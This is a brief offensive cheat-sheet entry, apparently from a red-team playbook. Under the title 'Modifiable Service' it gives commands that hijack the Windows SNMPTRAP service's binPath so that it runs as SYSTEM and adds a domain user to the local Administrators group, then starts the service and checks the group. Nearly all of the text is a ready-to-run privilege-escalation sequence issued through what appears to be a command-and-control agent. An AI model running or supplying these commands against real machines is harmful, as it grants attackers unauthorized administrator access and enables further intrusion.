# Modifiable Service

Add a domain user to the local admins group on the machine

    execute -o sc qc SNMPTRAP
    execute -o sc config SNMPTRAP binPath= "net localgroup Administrators domain.com\\user /add" obj= "NT AUTHORITY\\SYSTEM"
    execute -o sc config SNMPTRAP start= auto
    execute -o sc qc SNMPTRAP
    execute -o sc start SNMPTRAP


Check if now in local admins

    execute -o net localgroup administrators
